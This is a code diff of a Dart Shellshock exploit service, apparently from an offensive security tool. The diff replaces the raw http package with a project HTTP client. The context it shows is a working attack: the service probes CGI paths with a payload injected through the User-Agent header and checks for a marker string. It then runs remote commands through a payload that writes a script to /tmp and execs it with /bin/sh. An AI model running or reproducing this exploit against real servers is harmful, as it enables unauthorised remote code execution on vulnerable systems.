@@ -1,6 +1,5 @@
-import 'package:http/http.dart' as http;
-
 import 'exp_result.dart';
+import '../../../core/http/http_client.dart';
 
 class ShellshockExpService {
   final String baseUrl;
@@ -18,6 +17,12 @@ class ShellshockExpService {
 
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
 
   // 必须包含 Content-Type 头，否则 Apache mod_cgi 返回 500 错误页
   static const _checkPayload =
@@ -40,13 +45,17 @@ class ShellshockExpService {
       final url = '$_base$path';
       onLog?.call('[*] 探测 $url');
       try {
-        final res = await http.get(
-          Uri.parse(url),
+        final res = await _httpClient.get(
+          url,
           headers: {'User-Agent': _checkPayload},
-        ).timeout(timeout);
-        onLog?.call('[i] HTTP ${res.statusCode}  body(${res.body.length}B): '
-            '${res.body.substring(0, res.body.length.clamp(0, 80)).replaceAll('\n', ' ')}');
-        if (res.body.contains('SHELLSHOCK_54289')) {
+        );
+        final body = res.body ?? '';
+        final previewLen = body.length.clamp(0, 80);
+        onLog?.call(
+          '[i] HTTP ${res.statusCode}  body(${body.length}B): '
+          '${body.substring(0, previewLen).replaceAll('\n', ' ')}',
+        );
+        if (body.contains('SHELLSHOCK_54289')) {
           discoveredPath = path;
           return ExpResult(
             true,
@@ -72,11 +81,11 @@ class ShellshockExpService {
         'unset HTTP_USER_AGENT; exec /bin/sh /tmp/_ss_\$\$';
     final url = '$_base$path';
     try {
-      final res = await http.get(
-        Uri.parse(url),
+      final res = await _httpClient.get(
+        url,
         headers: {'User-Agent': payload},
-      ).timeout(timeout);
-      final body = res.body;
+      );
+      final body = res.body ?? '';
       final s = body.indexOf(_rceS);
       final e = body.indexOf(_rceE);
       if (s == -1 || e == -1) return null;
